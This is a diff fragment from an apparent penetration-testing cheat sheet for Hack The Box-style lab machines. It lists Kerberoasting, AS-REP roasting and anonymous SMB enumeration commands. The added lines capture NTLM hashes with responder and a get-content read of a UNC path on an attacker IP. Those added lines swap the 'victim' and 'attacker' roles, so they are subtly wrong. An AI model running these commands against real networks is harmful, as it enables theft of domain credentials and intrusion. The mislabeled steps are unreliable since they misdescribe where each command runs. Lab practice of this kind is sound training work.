@@ -44,6 +44,11 @@ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
 smbclient -L //10.10.10.100   (enter if password is requested)
 smbclient -U anonymous  //10.10.10.130/batshare
 
+# steal smbhash when having a shell
+## victim
+responder -I tun0
+## attacker
+get-content \\10.10.14.73\blablabla
 # get user hahses 
 GetNPUsers.py DOMAIN/ -usersfile ausers.txt
 
